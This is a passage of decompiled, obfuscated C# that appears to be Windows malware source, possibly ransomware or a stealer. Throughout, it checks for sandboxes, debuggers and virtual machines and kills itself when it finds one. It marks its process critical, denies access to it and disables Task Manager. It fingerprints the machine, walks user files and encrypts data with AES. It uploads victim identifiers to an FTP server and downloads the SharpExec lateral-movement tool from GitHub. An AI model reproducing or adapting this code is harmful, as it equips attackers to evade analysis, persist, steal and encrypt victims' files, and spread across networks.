				return false;
			}
			Class32.smethod_74(class25_0.class26_0, 16);
			class25_0.int_4 = 5;
			goto case 5;
		case 5:
			*(int*)((byte*)ptr + 4) = Class32.smethod_77(class25_0.class27_0, class25_0.class26_0, class25_0.int_8);
			class25_0.int_8 -= *(int*)((byte*)ptr + 4);
			if (class25_0.int_8 == 0)
			{
				class25_0.int_4 = 2;
				return true;
			}
			return !Class32.smethod_21(class25_0.class26_0);
		case 6:
			if (!Class32.smethod_55(class25_0.class29_0, class25_0.class26_0))
			{
				return false;
			}
			class25_0.class28_0 = Class32.smethod_9(class25_0.class29_0);
			class25_0.class28_1 = Class32.smethod_31(class25_0.class29_0);
			class25_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class32.smethod_30(class25_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	unsafe static int smethod_48(Class24.Class28 class28_0, Class24.Class26 class26_0)
	{
		void* ptr = stackalloc byte[16];
		int num;
		int num2;
		if ((num = Class32.smethod_3(class26_0, 9)) >= 0)
		{
			if ((num2 = class28_0.short_0[num]) >= 0)
			{
				Class32.smethod_74(class26_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)ptr = -(num2 >> 4);
			*(int*)((byte*)ptr + 4) = num2 & 0xF;
			if ((num = Class32.smethod_3(class26_0, *(int*)((byte*)ptr + 4))) >= 0)
			{
				num2 = class28_0.short_0[*(int*)ptr | (num >> 9)];
				Class32.smethod_74(class26_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)((byte*)ptr + 8) = class26_0.int_2;
			num = Class32.smethod_3(class26_0, *(int*)((byte*)ptr + 8));
			num2 = class28_0.short_0[*(int*)ptr | (num >> 9)];
			if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
			{
				Class32.smethod_74(class26_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		*(int*)((byte*)ptr + 12) = class26_0.int_2;
		num = Class32.smethod_3(class26_0, *(int*)((byte*)ptr + 12));
		num2 = class28_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= *(int*)((byte*)ptr + 12))
		{
			Class32.smethod_74(class26_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	unsafe static bool smethod_49()
	{
		void* ptr = stackalloc byte[9];
		try
		{
			*(long*)ptr = 61000000000L;
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= *(long*)ptr)
			{
				((byte*)ptr)[8] = 1;
				goto IL_0037;
			}
		}
		catch
		{
		}
		return false;
		IL_0037:
		return ((byte*)ptr)[8] != 0;
	}

	static void smethod_50(Class12 class12_0)
	{
		IntPtr currentProcess = Class32.GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = Class32.smethod_19(currentProcess, class12_0);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		Class32.smethod_35(rawSecurityDescriptor, class12_0, currentProcess);
	}

	static ICryptoTransform smethod_51(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_0, byte_1) : symmetricAlgorithm.CreateEncryptor(byte_0, byte_1);
	}

	static string smethod_52()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = "C";
		ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		return text3 + text;
	}

	static void smethod_53(Class24.Class26 class26_0)
	{
		class26_0.uint_0 >>= class26_0.int_2 & 7;
		class26_0.int_2 &= -8;
	}

	static void smethod_54()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		try
		{
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(Class32.smethod_26));
			Process.EnterDebugMode();
			Class32.RtlSetProcessIsCritical(1u, 0u, 0u);
		}
		catch
		{
		}
	}

	unsafe static bool smethod_55(Class24.Class29 class29_0, Class24.Class26 class26_0)
	{
		void* ptr = stackalloc byte[12];
		while (true)
		{
			*(int*)ptr = class29_0.int_2;
			switch (*(int*)ptr)
			{
			case 5:
			{
				*(int*)((byte*)ptr + 8) = Class24.Class29.int_1[class29_0.int_7];
				int num = Class32.smethod_3(class26_0, *(int*)((byte*)ptr + 8));
				if (num >= 0)
				{
					Class32.smethod_74(class26_0, *(int*)((byte*)ptr + 8));
					num += Class24.Class29.int_0[class29_0.int_7];
					while (num-- > 0)
					{
						byte[] byte_ = class29_0.byte_1;
						*(int*)ptr = class29_0.int_8;
						class29_0.int_8 = *(int*)ptr + 1;
						byte_[*(int*)ptr] = class29_0.byte_2;
					}
					if (class29_0.int_8 == class29_0.int_6)
					{
						return true;
					}
					goto IL_0084;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class32.smethod_48(class29_0.class28_0, class26_0)) & -16) == 0)
				{
					byte[] byte_2 = class29_0.byte_1;
					*(int*)ptr = class29_0.int_8;
					class29_0.int_8 = *(int*)ptr + 1;
					byte_2[*(int*)ptr] = (class29_0.byte_2 = (byte)num2);
					if (class29_0.int_8 == class29_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class29_0.byte_2 = 0;
					}
					class29_0.int_7 = num2 - 16;
					class29_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class29_0.int_8 < class29_0.int_5)
				{
					*(int*)((byte*)ptr + 4) = Class32.smethod_3(class26_0, 3);
					if (*(int*)((byte*)ptr + 4) >= 0)
					{
						Class32.smethod_74(class26_0, 3);
						class29_0.byte_0[Class24.Class29.int_9[class29_0.int_8]] = (byte)(*(uint*)((byte*)ptr + 4));
						class29_0.int_8++;
						continue;
					}
					return false;
				}
				class29_0.class28_0 = new Class24.Class28(class29_0.byte_0);
				class29_0.byte_0 = null;
				class29_0.int_8 = 0;
				class29_0.int_2 = 4;
				goto case 4;
			case 2:
				class29_0.int_5 = Class32.smethod_3(class26_0, 4);
				if (class29_0.int_5 >= 0)
				{
					class29_0.int_5 += 4;
					Class32.smethod_74(class26_0, 4);
					class29_0.byte_0 = new byte[19];
					class29_0.int_8 = 0;
					class29_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class29_0.int_4 = Class32.smethod_3(class26_0, 5);
				if (class29_0.int_4 >= 0)
				{
					class29_0.int_4++;
					Class32.smethod_74(class26_0, 5);
					class29_0.int_6 = class29_0.int_3 + class29_0.int_4;
					class29_0.byte_1 = new byte[class29_0.int_6];
					class29_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class29_0.int_3 = Class32.smethod_3(class26_0, 5);
				if (class29_0.int_3 >= 0)
				{
					class29_0.int_3 += 257;
					Class32.smethod_74(class26_0, 5);
					class29_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_0084:
			class29_0.int_2 = 4;
		}
	}

	static string smethod_56()
	{
		if (IntPtr.Size == 8)
		{
			return Class32.smethod_10(new Uri("https://raw.githubusercontent.com/anthemtotheego/SharpExec/master/CompiledBinaries/SharpExec_x64.exe"));
		}
		return Class32.smethod_10(new Uri("https://raw.githubusercontent.com/anthemtotheego/SharpExec/master/CompiledBinaries/SharpExec_x86.exe"));
	}

	static List<string> smethod_57(string string_0)
	{
		List<string> list = new List<string>();
		return Class32.smethod_76(string_0);
	}

	static bool smethod_58()
	{
		try
		{
			if (Class32.GetModuleHandle("SbieDll.dll").ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	static string smethod_59(string string_0 = "", string string_1 = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = string_0,
				Arguments = string_1,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit();
			return result;
		}
		catch
		{
			return result;
		}
	}

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_0);

	static ICryptoTransform smethod_60(byte[] byte_0, bool bool_0, byte[] byte_1)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_1, byte_0) : dESCryptoServiceProvider.CreateEncryptor(byte_1, byte_0);
	}

	static string smethod_61()
	{
		Process process = null;
		string empty = string.Empty;
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo("arp", "-a");
			processStartInfo.CreateNoWindow = true;
			processStartInfo.UseShellExecute = false;
			processStartInfo.RedirectStandardOutput = true;
			process = Process.Start(processStartInfo);
			empty = process.StandardOutput.ReadToEnd();
			process.Close();
			return empty;
		}
		catch (Exception innerException)
		{
			throw new Exception("IPInfo: Error Retrieving 'arp -a' Results", innerException);
		}
		finally
		{
			process?.Close();
		}
	}

	unsafe static int smethod_62(Class24.Class26 class26_0, byte[] byte_0, int int_0, int int_1)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		while (class26_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class26_0.uint_0;
			class26_0.uint_0 >>= 8;
			class26_0.int_2 -= 8;
			int_1--;
			(*(int*)ptr)++;
		}
		if (int_1 == 0)
		{
			return *(int*)ptr;
		}
		*(int*)((byte*)ptr + 4) = class26_0.int_1 - class26_0.int_0;
		if (int_1 > *(int*)((byte*)ptr + 4))
		{
			int_1 = *(int*)((byte*)ptr + 4);
		}
		Array.Copy(class26_0.byte_0, class26_0.int_0, byte_0, int_0, int_1);
		class26_0.int_0 += int_1;
		if (((uint)(class26_0.int_0 - class26_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			byte[] byte_ = class26_0.byte_0;
			*(int*)((byte*)ptr + 8) = class26_0.int_0;
			class26_0.int_0 = *(int*)((byte*)ptr + 8) + 1;
			class26_0.uint_0 = byte_[*(int*)((byte*)ptr + 8)] & 0xFFu;
			class26_0.int_2 = 8;
		}
		return *(int*)ptr + int_1;
	}

	static void smethod_63()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("This program requires Microsoft .NET Framework v. 4.82 or superior to run properly", "Atention!", (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	static byte[] smethod_64(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, byte_2, 52768);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	static short smethod_65(int int_0)
	{
		return (short)((Class24.Class30.byte_0[int_0 & 0xF] << 12) | (Class24.Class30.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class24.Class30.byte_0[(int_0 >> 8) & 0xF] << 4) | Class24.Class30.byte_0[int_0 >> 12]);
	}

	static void smethod_66(string string_0 = "ftp://files.000webhost.com/public_html/", string string_1 = "FTP UserName", string string_2 = "FTP Password", string string_3 = "")
	{
		try
		{
			string text = Class32.smethod_52();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(string_0 + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(string_1, string_2);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(string_3);
			ftpWebRequest.ContentLength = bytes.Length;
			using (Stream stream = ftpWebRequest.GetRequestStream())
			{
				stream.Write(bytes, 0, bytes.Length);
			}
			using ((FtpWebResponse)ftpWebRequest.GetResponse())
			{
			}
		}
		catch
		{
		}
	}

	unsafe static List<string> smethod_67(string string_0)
	{
		void* ptr = stackalloc byte[8];
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		if (!Directory.Exists(string_0))
		{
			throw new ArgumentException();
		}
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch (UnauthorizedAccessException)
			{
				continue;
			}
			catch (DirectoryNotFoundException)
			{
				continue;
			}
			catch (PathTooLongException)
			{
				continue;
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer"))
				{
					array = Directory.GetFiles(text);
					goto IL_00c2;
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (DirectoryNotFoundException)
			{
			}
			catch
			{
			}
			continue;
			IL_00c2:
			string[] array2 = array;
			*(int*)ptr = 0;
			while (*(int*)ptr < array2.Length)
			{
				string fileName = array2[*(int*)ptr];
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(Class0.string_2) * 1024.0 * 1024.0 && Class0.string_1 == "YES")
					{
						list.Add(fileInfo.FullName);
					}
					else if (File.Exists(fileInfo.FullName) && Class0.string_1 == "NO")
					{
						list.Add(fileInfo.FullName);
					}
				}
				catch (FileNotFoundException)
				{
				}
				catch (PathTooLongException)
				{
				}
				catch
				{
				}
				(*(int*)ptr)++;
			}
			string[] array3 = directories;
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < array3.Length)
			{
				string item = array3[*(int*)((byte*)ptr + 4)];
				stack.Push(item);
				(*(int*)((byte*)ptr + 4))++;
			}
		}
		return list;
	}

	static Rfc2898DeriveBytes smethod_68(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	unsafe static int smethod_69(byte[] byte_0, int int_0, int int_1, Class24.Class27 class27_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = class27_0.int_0;
		if (int_0 > class27_0.int_1)
		{
			int_0 = class27_0.int_1;
		}
		else
		{
			*(int*)ptr = (class27_0.int_0 - class27_0.int_1 + int_0) & 0x7FFF;
		}
		*(int*)((byte*)ptr + 4) = int_0;
		*(int*)((byte*)ptr + 8) = int_0 - *(int*)ptr;
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Array.Copy(class27_0.byte_0, 32768 - *(int*)((byte*)ptr + 8), byte_0, int_1, *(int*)((byte*)ptr + 8));
			int_1 += *(int*)((byte*)ptr + 8);
			int_0 = *(int*)ptr;
		}
		Array.Copy(class27_0.byte_0, *(int*)ptr - int_0, byte_0, int_1, int_0);
		class27_0.int_1 -= *(int*)((byte*)ptr + 4);
		if (class27_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return *(int*)((byte*)ptr + 4);
	}

	static bool smethod_70(Assembly assembly_0, Assembly assembly_1)
	{
		return true;
	}

	static void smethod_71(Class12 class12_0, bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (bool_0 && registryKey.GetValue("DisableTaskMgr") != null)
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			else
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	static void smethod_72()
	{
		if (Class32.smethod_7() || Class32.smethod_25() || Class32.smethod_58() || Class32.smethod_49() || Class32.smethod_73())
		{
			Process.GetCurrentProcess().Kill();
		}
		Environment.FailFast(null);
	}

	static bool smethod_73()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (new ComputerInfo().get_OSFullName().ToLower().Contains("xp"))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	static void smethod_74(Class24.Class26 class26_0, int int_0)
	{
		class26_0.uint_0 >>= int_0;
		class26_0.int_2 -= int_0;
	}

	static void smethod_75()
	{
		try
		{
			Class32.RtlSetProcessIsCritical(0u, 0u, 0u);
		}
		catch
		{
			while (true)
			{
				Thread.Sleep(100000);
			}
		}
	}

	unsafe static List<string> smethod_76(string string_0)
	{
		void* ptr = stackalloc byte[8];
		string[] array = null;
		string[] array2 = null;
		try
		{
			array = Directory.GetFiles(string_0, "*.*");
		}
		catch (UnauthorizedAccessException ex)
		{
			Class0.Class1.stringCollection_0.Add(ex.Message);
		}
		catch (DirectoryNotFoundException)
		{
		}
		if (array != null)
		{
			string[] array3 = array;
			*(int*)ptr = 0;
			while (*(int*)ptr < array3.Length)
			{
				string text = array3[*(int*)ptr];
				try
				{
					if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer"))
					{
						if (File.Exists(text) && (double)text.Length <= double.Parse(Class0.string_2) * 1024.0 * 1024.0 && Class0.string_1 == "YES")
						{
							Class0.Class1.list_0.Add(text);
						}
						else if (File.Exists(text) && Class0.string_1 == "NO")
						{
							Class0.Class1.list_0.Add(text);
						}
					}
				}
				catch
				{
				}
				(*(int*)ptr)++;
			}
			array2 = Directory.GetDirectories(string_0);
			string[] array4 = array2;
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < array4.Length)
			{
				string string_ = array4[*(int*)((byte*)ptr + 4)];
				Class32.smethod_76(string_);
				(*(int*)((byte*)ptr + 4))++;
			}
		}
		return Class0.Class1.list_0;
	}

	unsafe static int smethod_77(Class24.Class27 class27_0, Class24.Class26 class26_0, int int_0)
	{
		void* ptr = stackalloc byte[8];
		int_0 = Math.Min(Math.Min(int_0, 32768 - class27_0.int_1), Class32.smethod_5(class26_0));
		*(int*)((byte*)ptr + 4) = 32768 - class27_0.int_0;
		if (int_0 > *(int*)((byte*)ptr + 4))
		{
			*(int*)ptr = Class32.smethod_62(class26_0, class27_0.byte_0, class27_0.int_0, *(int*)((byte*)ptr + 4));
			if (*(int*)ptr == *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr += Class32.smethod_62(class26_0, class27_0.byte_0, 0, int_0 - *(int*)((byte*)ptr + 4));
			}
		}
		else
		{
			*(int*)ptr = Class32.smethod_62(class26_0, class27_0.byte_0, class27_0.int_0, int_0);
		}
		class27_0.int_0 = (class27_0.int_0 + *(int*)ptr) & 0x7FFF;
		class27_0.int_1 += *(int*)ptr;
		return *(int*)ptr;
	}

	static int smethod_78(Class24.Stream0 stream0_0)
	{
		return Class32.smethod_29(stream0_0) | (Class32.smethod_29(stream0_0) << 16);
	}
}
